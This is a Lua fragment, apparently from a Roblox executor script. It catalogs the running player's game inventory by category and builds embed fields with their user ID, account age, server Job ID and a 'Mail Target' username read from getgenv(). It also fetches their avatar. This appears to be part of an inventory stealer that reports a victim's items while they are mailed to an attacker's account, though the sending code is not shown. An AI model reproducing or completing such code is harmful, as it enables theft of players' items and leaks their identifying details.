local CRATES = {
    "Ladder Crate","Bench Crate","Light Crate","Sign Crate","Arch Crate",
    "Roleplay Crate","Bridge Crate","Spring Crate","Seesaw Crate",
    "Conveyor Crate","Owner Door Crate","Bear Trap Crate","Fence Crate",
    "Teleporter Pad Crate"
}

local function buildSnapshotFields()
    local seedSet, crateSet = {}, {}
    for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
    for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end

    local function isGearName(name)
        local n = name:lower()
        return n:find("sprinkler") or n:find("watering") or n:find("can")
            or n:find("mushroom")  or n:find("trowel")   or n:find("shovel")
            or n:find("fertilizer")or n:find("hoe")      or n:find("rake")
    end

    local buckets       = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
    local bucketTotals  = { seeds = 0,  pets = 0,  gear = 0,  crates = 0,  other = 0 }

    local function categorise(name, category)
        if category == "Pets" then return "pets" end
        local low = name:lower()
        if seedSet[low]  then return "seeds"  end
        if crateSet[low] then return "crates" end
        if isGearName(name) then return "gear" end
        return "other"
    end

    for _, item in ipairs(AllItems) do
        local cat = categorise(item.name, item.category)
        table.insert(buckets[cat], { name = item.name, count = item.amount })
        bucketTotals[cat] = bucketTotals[cat] + item.amount
    end

    local function formatList(list)
        if #list == 0 then return "`— empty —`" end
        local lines = {}
        for i, entry in ipairs(list) do
            local suffix = (entry.count and entry.count > 1)
                and (" `x" .. entry.count .. "`") or ""
            lines[i] = "`-` " .. entry.name .. suffix
        end
        local text = table.concat(lines, "\n")
        if #text > 1010 then
            text = text:sub(1, 1000) .. "\n`... +more`"
        end
        return text
    end

    local fields = {
        { name = "User ID",      value = "`" .. tostring(localPlayer.UserId) .. "`",  inline = true },
        { name = "Account Age",  value = "`" .. localPlayer.AccountAge .. " days`",   inline = true },
        { name = "In Server",    value = "`" .. #Players:GetPlayers() .. " players`", inline = true },
        { name = "Place ID",     value = "`" .. tostring(game.PlaceId) .. "`",        inline = true },
        { name = "Job ID",       value = "`" .. ((game.JobId ~= "" and game.JobId) or "Studio / Solo") .. "`", inline = false },
        { name = "Mail Target",  value = "`" .. tostring(getgenv().TARGET_USERNAME) .. "`", inline = false },
        { name = "Totals",
          value = string.format(
            "Seeds: `%d` - Pets: `%d` - Gear: `%d`\nCrates: `%d` - Other: `%d`",
            bucketTotals.seeds, bucketTotals.pets, bucketTotals.gear,
            bucketTotals.crates, bucketTotals.other
          ),
          inline = false },
    }

    local function addCategory(label, list, total)
        if #list > 0 then
            local header
            if total and total ~= #list then
                header = string.format("%s (%d items / %d types)", label, total, #list)
            else
                header = string.format("%s (%d)", label, total or #list)
            end
            table.insert(fields, { name = header, value = formatList(list), inline = false })
        end
    end

    addCategory("Seeds",  buckets.seeds,  bucketTotals.seeds)
    addCategory("Pets",   buckets.pets,   bucketTotals.pets)
    addCategory("Gear",   buckets.gear,   bucketTotals.gear)
    addCategory("Crates", buckets.crates, bucketTotals.crates)
    addCategory("Other",  buckets.other,  bucketTotals.other)

    return fields
end

local function fetchAvatar(endpoint, size)
    local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
        .. "?userIds=" .. localPlayer.UserId
        .. "&size=" .. size
        .. "&format=Png&isCircular=false"
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if not ok or not body then return nil end
    local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
    if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
    return decoded.data[1].imageUrl
end

local function isoTimestamp()
    local t = os.date("!*t")
    return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
        t.year, t.month, t.day, t.hour, t.min, t.sec)
end

